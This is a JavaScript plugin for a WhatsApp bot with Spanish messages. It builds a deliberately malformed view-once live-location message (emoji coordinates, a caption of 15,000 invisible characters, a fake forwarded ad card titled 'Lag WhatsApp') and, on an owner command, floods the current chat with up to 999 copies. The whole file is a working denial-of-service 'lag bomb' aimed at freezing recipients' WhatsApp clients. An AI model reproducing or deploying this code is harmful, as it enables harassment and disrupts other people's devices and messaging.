const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(15000) + '💥'.repeat(300),
        sequenceNumber: '999',
        jpegThumbnail: null,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag WhatsApp',
            body: 'Este mensaje es muy pesado',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) return

  const match = m.text?.match(/^¤(?:-(\d{1,3}))?$/)
  if (!match) return

  const repeatCount = parseInt(match[1]) || 1
  if (repeatCount < 1 || repeatCount >= 1000) return

  const jid = m.chat

  for (let i = 0; i < repeatCount; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 200))
    } catch (error) {
      console.error('Error al enviar mensaje:', error)
    }
  }
}

handler.command = new RegExp
handler.customPrefix = /^¤(?:-\d{1,3})?$/i
handler.tags = ['owner']
handler.help = ['¤-n']

export default handler